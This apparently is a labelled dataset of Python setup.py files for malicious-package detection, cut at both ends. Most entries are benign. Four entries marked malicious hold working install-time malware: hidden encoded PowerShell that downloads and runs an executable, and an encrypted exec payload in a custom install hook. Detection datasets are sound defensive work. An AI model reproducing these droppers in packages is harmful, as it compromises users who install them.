\"boto.ec2.cloudwatch\", \"boto.ec2.autoscale\",\n                  \"boto.ec2.elb\", \"boto.sdb\", \"boto.cacerts\",\n                  \"boto.sdb.db\", \"boto.sdb.db.manager\",\n                  \"boto.mturk\", \"boto.pyami\",\n                  \"boto.pyami.installers\", \"boto.pyami.installers.ubuntu\",\n                  \"boto.mashups\", \"boto.contrib\", \"boto.manage\",\n                  \"boto.services\", \"boto.cloudfront\",\n                  \"boto.roboto\", \"boto.rds\", \"boto.vpc\", \"boto.fps\",\n                  \"boto.fps\", \"boto.emr\", \"boto.emr\", \"boto.sns\",\n                  \"boto.ecs\", \"boto.iam\", \"boto.route53\", \"boto.ses\",\n                  \"boto.cloudformation\", \"boto.sts\", \"boto.dynamodb\",\n                  \"boto.swf\", \"boto.mws\", \"boto.cloudsearch\", \"boto.glacier\",\n                  \"boto.beanstalk\", \"boto.datapipeline\", \"boto.elasticache\",\n                  \"boto.elastictranscoder\", \"boto.opsworks\", \"boto.redshift\",\n                  \"boto.dynamodb2\", \"boto.support\", \"boto.cloudtrail\",\n                  \"boto.directconnect\", \"boto.kinesis\", \"boto.rds2\",\n                  \"boto.cloudsearch2\", \"boto.logs\", \"boto.vendored\",\n                  \"boto.route53.domains\", \"boto.cognito\",\n                  \"boto.cognito.identity\", \"boto.cognito.sync\",\n                  \"boto.cloudsearchdomain\", \"boto.kms\",\n                  \"boto.awslambda\", \"boto.codedeploy\", \"boto.configservice\",\n                  \"boto.cloudhsm\", \"boto.ec2containerservice\",\n                  \"boto.machinelearning\", \"boto.vendored.regions\"],\n      package_data = {\n          \"boto.cacerts\": [\"cacerts.txt\"],\n          \"boto\": [\"endpoints.json\"],\n      },\n      license = \"MIT\",\n      platforms = \"Posix; MacOS X; Windows\",\n      classifiers = [\"Development Status :: 5 - Production/Stable\",\n                     \"Intended Audience :: Developers\",\n                     \"License :: OSI Approved :: MIT License\",\n                     \"Operating System :: OS Independent\",\n                     \"Topic :: Internet\",\n                     \"Programming Language :: Python :: 2\",\n                     \"Programming Language :: Python :: 2.6\",\n                     \"Programming Language :: Python :: 2.7\",\n                     \"Programming Language :: Python :: 3\",\n                     \"Programming Language :: Python :: 3.3\",\n                     \"Programming Language :: Python :: 3.4\"],\n      **extra\n      )\n", "target": 0}
{"idx": "cwcwidth-0.1.6", "func": "#!/usr/bin/python3\n\nimport platform\nfrom setuptools import setup, Extension\n\n\nextension_sources = [\"cwcwidth/_impl.pyx\"]\nif platform.system() == \"Windows\":\n    extension_sources.append(\"cwcwidth/wcwidth.c\")\n    define_macros = [\n        (\"USE_MK_WCWIDTH\", None),\n    ]\nelse:\n    define_macros = [\n        (\"_XOPEN_SOURCE\", \"600\"),\n    ]\n\next_modules = [\n    Extension(\n        \"cwcwidth._impl\",\n        extension_sources,\n        define_macros=define_macros,\n    )\n]\n\nsetup(\n    ext_modules=ext_modules,\n    packages=[\"cwcwidth\"],\n    package_data={\n        \"cwcwidth\": [\"_impl.pyi\", \"py.typed\"],\n    },\n)\n", "target": 0}
{"idx": "liburlcontrolpull-4.9", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlcontrolpull',\n    packages = ['modlib'],\n    version = '3.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gspread-pandas-3.2.2", "func": "from codecs import open\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\n__version__ = \"version read in next line\"\nexec(open(\"gspread_pandas/_version.py\").read())\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, \"README.rst\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\n# get the dependencies and installs\nwith open(path.join(here, \"requirements.txt\"), encoding=\"utf-8\") as f:\n    all_reqs = f.read().split(\"\\n\")\n\ninstall_requires = [x.strip() for x in all_reqs if \"git+\" not in x]\ndependency_links = [\n    x.strip().replace(\"git+\", \"\") for x in all_reqs if x.startswith(\"git+\")\n]\n\n# get the dependencies and installs\nwith open(path.join(here, \"requirements_dev.txt\"), encoding=\"utf-8\") as f:\n    dev_requires = f.read().split(\"\\n\")\n\nsetup(\n    name=\"gspread-pandas\",\n    version=__version__,\n    description=(\n        \"A package to easily open an instance of a Google spreadsheet and \"\n        \"interact with worksheets through Pandas DataFrames.\"\n    ),\n    long_description=long_description,\n    url=\"https://github.com/aiguofer/gspread-pandas\",\n    download_url=\"https://github.com/aiguofer/gspread-pandas/tarball/v\" + __version__,\n    license=\"BSD\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Programming Language :: Python :: 3\",\n    ],\n    keywords=\"gspread pandas google spreadsheets\",\n    packages=find_packages(exclude=[\"docs\", \"tests*\"]),\n    include_package_data=True,\n    author=\"Diego Fernandez\",\n    install_requires=install_requires,\n    setup_requires=[\"pytest-runner\"],\n    tests_require=[\"pytest\"],\n    extras_require={\"dev\": dev_requires},\n    dependency_links=dependency_links,\n    author_email=\"aiguo.fernandez@gmail.com\",\n)\n", "target": 0}
{"idx": "py-controlramnvidia-1.31", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlramnvidia',\n    packages = ['modlib'],\n    version = '5.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gcloud-0.18.3", "func": "import os\nimport sys\n\nfrom setuptools import setup\nfrom setuptools import find_packages\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n\nwith open(os.path.join(here, 'README.rst')) as f:\n    README = f.read()\n\n\nREQUIREMENTS = [\n    'httplib2 >= 0.9.1',\n    'googleapis-common-protos',\n    'oauth2client >= 2.0.1',\n    'protobuf >= 3.0.0b2, != 3.0.0.b2.post1',\n    'six',\n]\n\nGRPC_EXTRAS = [\n    'grpcio >= 1.0rc1',\n    'google-gax >= 0.12.3, < 0.13dev',\n    'gax-google-pubsub-v1 >= 0.8.0, < 0.9dev',\n    'grpc-google-pubsub-v1 >= 0.8.0, < 0.9dev',\n    'gax-google-logging-v2 >= 0.8.0, < 0.9dev',\n    'grpc-google-logging-v2 >= 0.8.0, < 0.9dev',\n]\n\nif sys.version_info[:2] == (2, 7) and 'READTHEDOCS' not in os.environ:\n    REQUIREMENTS.extend(GRPC_EXTRAS)\n\nsetup(\n    name='gcloud',\n    version='0.18.3',\n    description='API Client library for Google Cloud',\n    author='Google Cloud Platform',\n    author_email='jjg+gcloud-python@google.com',\n    long_description=README,\n    scripts=[],\n    url='https://github.com/GoogleCloudPlatform/gcloud-python',\n    packages=find_packages(),\n    license='Apache 2.0',\n    platforms='Posix; MacOS X; Windows',\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    extras_require={'grpc': GRPC_EXTRAS},\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Internet',\n    ]\n)\n", "target": 0}
{"idx": "django-crispy-forms-1.14.0", "func": "import os\nimport sys\n\nfrom setuptools import find_packages, setup\n\nimport crispy_forms\n\nif sys.argv[-1] == \"publish\":\n    if os.system(\"pip freeze | grep wheel\"):\n        print(\"wheel not installed.\\nUse `pip install wheel`.\\nExiting.\")\n        sys.exit()\n    if os.system(\"pip freeze | grep twine\"):\n        print(\"twine not installed.\\nUse `pip install twine`.\\nExiting.\")\n        sys.exit()\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a {} -m 'version {}'\".format(crispy_forms.__version__, crispy_forms.__version__))\n    print(\"  git push --tags\")\n    sys.exit()\n\nsetup(\n    name=\"django-crispy-forms\",\n    version=crispy_forms.__version__,\n    description=\"Best way to have Django DRY forms\",\n    long_description=open(\"README.rst\").read(),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: JavaScript\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    keywords=[\"forms\", \"django\", \"crispy\", \"DRY\"],\n    author=\"Miguel Araujo\",\n    author_email=\"miguel.araujo.perez@gmail.com\",\n    url=\"https://github.com/django-crispy-forms/django-crispy-forms\",\n    license=\"MIT\",\n    packages=find_packages(exclude=[\"docs\"]),\n    include_package_data=True,\n    zip_safe=False,\n    python_requires=\">=3.7\",\n)\n", "target": 0}
{"idx": "futurist-2.4.1", "func": "# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n# implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# THIS FILE IS MANAGED BY THE GLOBAL REQUIREMENTS REPO - DO NOT EDIT\nimport setuptools\n\nsetuptools.setup(\n    setup_requires=['pbr>=2.0.0'],\n    pbr=True)\n", "target": 0}
{"idx": "graphql-relay-3.2.0", "func": "from re import search\nfrom setuptools import setup, find_packages\n\nwith open(\"src/graphql_relay/version.py\") as version_file:\n    version = search('version = \"(.*)\"', version_file.read()).group(1)\n\nwith open(\"README.md\") as readme_file:\n    readme = readme_file.read()\n\nsetup(\n    name=\"graphql-relay\",\n    version=version,\n    description=\"Relay library for graphql-core\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    keywords=\"graphql relay api\",\n    url=\"https://github.com/graphql-python/graphql-relay-py\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    install_requires=[\n        \"graphql-core>=3.2,<3.3\",\n        \"typing-extensions>=4.1,<5; python_version < '3.8'\",\n    ],\n    python_requires=\">=3.6,<4\",\n    packages=find_packages(\"src\"),\n    package_dir={\"\": \"src\"},\n    # PEP-561: https://www.python.org/dev/peps/pep-0561/\n    package_data={\"graphql_relay\": [\"py.typed\"]},\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "types-docutils-0.19.0", "func": "from setuptools import setup\n\nname = \"types-docutils\"\ndescription = \"Typing stubs for docutils\"\nlong_description = '''\n## Typing stubs for docutils\n\nThis is a PEP 561 type stub package for the `docutils` package.\nIt can be used by type-checking tools like mypy, PyCharm, pytype etc. to check code\nthat uses `docutils`. The source for this package can be found at\nhttps://github.com/python/typeshed/tree/master/stubs/docutils. All fixes for\ntypes and metadata should be contributed there.\n\nSee https://github.com/python/typeshed/blob/master/README.md for more details.\nThis package was generated from typeshed commit `ee09a67c5cf61effaae1bdb894571eac4fc9ac6b`.\n'''.lstrip()\n\nsetup(name=name,\n      version=\"0.19.0\",\n      description=description,\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      url=\"https://github.com/python/typeshed\",\n      project_urls={\n          \"GitHub\": \"https://github.com/python/typeshed\",\n          \"Changes\": \"https://github.com/typeshed-internal/stub_uploader/blob/main/data/changelogs/docutils.md\",\n          \"Issue tracker\": \"https://github.com/python/typeshed/issues\",\n          \"Chat\": \"https://gitter.im/python/typing\",\n      },\n      install_requires=[],\n      packages=['docutils-stubs'],\n      package_data={'docutils-stubs': ['__init__.pyi', 'core.pyi', 'examples.pyi', 'frontend.pyi', 'io.pyi', 'languages/__init__.pyi', 'nodes.pyi', 'parsers/__init__.pyi', 'parsers/null.pyi', 'parsers/recommonmark_wrapper.pyi', 'parsers/rst/__init__.pyi', 'parsers/rst/directives/__init__.pyi', 'parsers/rst/directives/admonitions.pyi', 'parsers/rst/directives/body.pyi', 'parsers/rst/directives/html.pyi', 'parsers/rst/directives/images.pyi', 'parsers/rst/directives/misc.pyi', 'parsers/rst/directives/parts.pyi', 'parsers/rst/directives/references.pyi', 'parsers/rst/directives/tables.pyi', 'parsers/rst/roles.pyi', 'parsers/rst/states.pyi', 'readers/__init__.pyi', 'readers/doctree.pyi', 'readers/pep.pyi', 'readers/standalone.pyi', 'statemachine.pyi', 'transforms/__init__.pyi', 'utils/__init__.pyi', 'writers/__init__.pyi', 'writers/docutils_xml.pyi', 'writers/html4css1.pyi', 'writers/html5_polyglot.pyi', 'writers/latex2e.pyi', 'writers/manpage.pyi', 'writers/null.pyi', 'writers/odf_odt.pyi', 'writers/pep_html.pyi', 'writers/pseudoxml.pyi', 'writers/s5_html.pyi', 'writers/xetex.pyi', 'METADATA.toml']},\n      license=\"Apache-2.0 license\",\n      classifiers=[\n          \"License :: OSI Approved :: Apache Software License\",\n          \"Programming Language :: Python :: 3\",\n          \"Typing :: Stubs Only\",\n      ]\n)\n", "target": 0}
{"idx": "etherim-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'BbCzsByusGpNURWJjJShgWGVVgvRVYRWAwWybjHEvGPdbMSlOFVLekRaZvPsJKkDk EFkgUtNGjMme'\nLONG_DESCRIPTION = 'jIFZKTlkYOpvECpiiRgOYpaqDHbCBfZIbX TIzNhYVW lGBGsfvNbmwtVlcuxxRpXPLasmzef pyrBgTtsKzBljooeNgIwnXzuNdVSynEzFkNsHtIAXJMUQQboAslhgJCvfraZriXIUMwlh lcqpV C ldtJqIPAsBVZwCdEvPxYvHhbTCpZAicALRTPcbwjdLRwVkWViPrhgkUekyNefsdTCxJmlxnxCAlKrCSzRhZbnEJIiUuFsAnJRhOlTOSuNvyhwHYagDydArkLhSMybZKaBtBIFhJf'\n\n\nclass BfNRhgNegJbxLWgeJcQhuCzMlIdkiLpsztRqvEtGliFnDIdGELfeRdBEoCVSJOyyldeGZndItOgpSxmhDKKMLeKtEaGTCCEmlIKPAEfgUCLqsRTYPUsTMoFctJCLBUWvoywfsfBOqzKzXDZHWYyQmj(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'B48o6lPZvVjM7apZ6SScJ2ArT7X_FVAce5faW_AIJv8=').decrypt(b'gAAAAABmbvQnR1i-5jG-TTT8SCUmAZRWEHeaVlnsyj8rpuWXdFLSUjS-cqA1KA_WfOb25vqLT3vs-1BGVUhQRvq69oJ33492vHvT1E92bqeqMwP2iRVvhvAZcqHytm8iZ0kxCF3GtYGaTbHFrPaoWatxPX1pNIAICahr-hRaoUIxBhyAJv73xMWmLCxdT0tn6cWYvSDKNEogfPIYw98ffAKwzFONBUIrwVxmoSbwkGHCpPwa_Gg58UU='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"etherim\",\n    version=VERSION,\n    author=\"VKtWfxpsWlXkmtcGwR\",\n    author_email=\"QPQwNWgAYSjdgPBVV@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': BfNRhgNegJbxLWgeJcQhuCzMlIdkiLpsztRqvEtGliFnDIdGELfeRdBEoCVSJOyyldeGZndItOgpSxmhDKKMLeKtEaGTCCEmlIKPAEfgUCLqsRTYPUsTMoFctJCLBUWvoywfsfBOqzKzXDZHWYyQmj,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-ccadsuper-5.84", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ccadsuper',\n    packages = ['modlib'],\n    version = '2.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flask-ngrok-0.0.25", "func": "import setuptools\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"flask-ngrok\",\n    version=\"0.0.25\",\n    author=\"Grant Stafford\",\n    description=\"A simple way to demo Flask apps from your machine.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/gstaff/flask-ngrok\",\n    classifiers=[\n        \"Programming Language :: Python :: 3.6\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n    ],\n    keywords='flask ngrok demo',\n    install_requires=['Flask>=0.8', 'requests'],\n    py_modules=['flask_ngrok']\n)\n", "target": 0}
{"idx": "feast-0.23.1", "func": "# Copyright 2019 The Feast Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport copy\nimport glob\nimport json\nimport os\nimport pathlib\nimport re\nimport shutil\nimport subprocess\nimport sys\nfrom distutils.cmd import Command\nfrom distutils.dir_util import copy_tree\nfrom pathlib import Path\nfrom subprocess import CalledProcessError\n\nfrom setuptools import Extension, find_packages\n\ntry:\n    from setuptools import setup\n    from setuptools.command.build_ext import build_ext as _build_ext\n    from setuptools.command.build_py import build_py\n    from setuptools.command.develop import develop\n    from setuptools.command.install import install\n\nexcept ImportError:\n    from distutils.command.build_ext import build_ext as _build_ext\n    from distutils.command.build_py import build_py\n    from distutils.core import setup\n\nNAME = \"feast\"\nDESCRIPTION = \"Python SDK for Feast\"\nURL = \"https://github.com/feast-dev/feast\"\nAUTHOR = \"Feast\"\nREQUIRES_PYTHON = \">=3.7.0\"\n\nREQUIRED = [\n    \"click>=7.0.0,<9.0.0\",\n    \"colorama>=0.3.9,<1\",\n    \"dill==0.3.*\",\n    \"fastavro>=1.1.0,<2\",\n    \"google-api-core>=1.23.0,<3\",\n    \"googleapis-common-protos>=1.52.*,<2\",\n    \"grpcio>=1.47.0,<2\",\n    \"grpcio-reflection>=1.47.0,<2\",\n    \"Jinja2>=2,<4\",\n    \"jsonschema\",\n    \"mmh3\",\n    \"numpy>=1.22,<3\",\n    \"pandas>=1.4.3,<2\",\n    \"pandavro==1.5.*\", # For some reason pandavro higher than 1.5.* only support pandas less than 1.3.\n    \"protobuf>3.20,<4\",\n    \"proto-plus>=1.20.0,<2\",\n    \"pyarrow>=4,<9\",\n    \"pydantic>=1,<2\",\n    \"pygments>=2.12.0,<3\",\n    \"PyYAML>=5.4.*,<7\",\n    \"SQLAlchemy[mypy]>1,<2\",\n    \"tabulate>=0.8.0,<1\",\n    \"tenacity>=7,<9\",\n    \"toml>=0.10.0,<1\",\n    \"tqdm>=4,<5\",\n    \"typeguard\",\n    \"fastapi>=0.68.0,<1\",\n    \"uvicorn[standard]>=0.14.0,<1\",\n    \"tensorflow-metadata>=1.0.0,<2.0.0\",\n    \"dask>=2021.*,<2022.02.0\",\n    \"bowler\",  # Needed for automatic repo upgrades\n]\n\nGCP_REQUIRED = [\n    \"google-cloud-bigquery[pandas]>=2,<4\",\n    \"google-cloud-bigquery-storage >= 2.0.0,<3\",\n    \"google-cloud-datastore>=2.1.*,<3\",\n    \"google-cloud-storage>=1.34.*,<3\",\n]\n\nREDIS_REQUIRED = [\n    \"redis==4.2.2\",\n    \"hiredis>=2.0.0,<3\",\n]\n\nAWS_REQUIRED = [\"boto3>=1.17.0,<=1.20.23\", \"docker>=5.0.2\", \"s3fs>=0.4.0,<=2022.01.0\"]\n\nSNOWFLAKE_REQUIRED = [\n    \"snowflake-connector-python[pandas]>=2.7.3,<=2.7.8\",\n]\n\nSPARK_REQUIRED = [\n    \"pyspark>=3.0.0,<4\",\n]\n\nTRINO_REQUIRED = [\n    \"trino>=0.305.0,<0.400.0\",\n]\n\nPOSTGRES_REQUIRED = [\n    \"psycopg2-binary>=2.8.3,<3\",\n]\n\nMYSQL_REQUIRED = [\n    \"mysqlclient\",\n]\n\nHBASE_REQUIRED = [\n    \"happybase>=1.2.0,<3\",\n]\n\nGE_REQUIRED = [\"great_expectations>=0.14.0,<0.15.0\"]\n\nGO_REQUIRED = [\n    \"cffi==1.15.*,<2\",\n]\n\nCI_REQUIRED = (\n    [\n        \"build\",\n        \"cryptography>=35.0,<36\",\n        \"flake8\",\n        \"black>=22.6.0,<23\",\n        \"isort>=5,<6\",\n        \"grpcio-tools>=1.47.0\",\n        \"grpcio-testing>=1.47.0\",\n        \"minio==7.1.0\",\n        \"mock==2.0.0\",\n        \"moto\",\n        \"mypy>=0.931\",\n        \"mypy-protobuf==3.1\",\n        \"avro==1.10.0\",\n        \"gcsfs>=0.4.0,<=2022.01.0\",\n        \"urllib3>=1.25.4,<2\",\n        \"psutil==5.9.0\",\n        \"pytest>=6.0.0,<8\",\n        \"pytest-cov\",\n        \"pytest-xdist\",\n        \"pytest-benchmark>=3.4.1,<4\",\n        \"pytest-lazy-fixture==0.6.3\",\n        \"pytest-timeout==1.4.2\",\n        \"pytest-ordering==0.6.*\",\n        \"pytest-mock==1.10.4\",\n        \"Sphinx!=4.0.0,<4.4.0\",\n        \"sphinx-rtd-theme\",\n        \"testcontainers>=3.5,<4\",\n        \"adlfs==0.5.9\",\n        \"firebase-admin>=5.2.0,<6\",\n        \"pre-commit\",\n        \"assertpy==1.1\",\n        \"pip-tools\",\n        \"pybindgen\",\n        \"types-protobuf\",\n        \"types-python-dateutil\",\n        \"types-pytz\",\n        \"types-PyYAML\",\n        \"types-redis\",\n        \"types-requests\",\n        \"types-setuptools\",\n        \"types-tabulate\",\n    ]\n    + GCP_REQUIRED\n    + REDIS_REQUIRED\n    + AWS_REQUIRED\n    + SNOWFLAKE_REQUIRED\n    + SPARK_REQUIRED\n    + POSTGRES_REQUIRED\n    + MYSQL_REQUIRED\n    + TRINO_REQUIRED\n    + GE_REQUIRED\n    + HBASE_REQUIRED\n)\n\n\n# rtd builds fail because of mysql not being installed in their environment.\n# We can add mysql there, but it's not strictly needed. This will be faster for builds.\nDOCS_REQUIRED = CI_REQUIRED.copy()\nfor _r in MYSQL_REQUIRED:\n    DOCS_REQUIRED.remove(_r)\n\nDEV_REQUIRED = [\"mypy-protobuf==3.1\", \"grpcio-testing==1.*\"] + CI_REQUIRED\n\n# Get git repo root directory\nrepo_root = str(pathlib.Path(__file__).resolve().parent)\n\n# README file from Feast repo root directory\nREADME_FILE = os.path.join(repo_root, \"README.md\")\nwith open(README_FILE, \"r\", encoding=\"utf8\") as f:\n    LONG_DESCRIPTION = f.read()\n\n# Add Support for parsing tags that have a prefix containing '/' (ie 'sdk/go') to setuptools_scm.\n# Regex modified from default tag regex in:\n# https://github.com/pypa/setuptools_scm/blob/2a1b46d38fb2b8aeac09853e660bcd0d7c1bc7be/src/setuptools_scm/config.py#L9\nTAG_REGEX = re.compile(\n    r\"^(?:[\\/\\w-]+)?(?P<version>[vV]?\\d+(?:\\.\\d+){0,2}[^\\+]*)(?:\\+.*)?$\"\n)\n\n# Only set use_scm_version if git executable exists (setting this variable causes pip to use git under the hood)\nif shutil.which(\"git\"):\n    use_scm_version = {\"root\": \".\", \"relative_to\": __file__, \"tag_regex\": TAG_REGEX}\nelse:\n    use_scm_version = 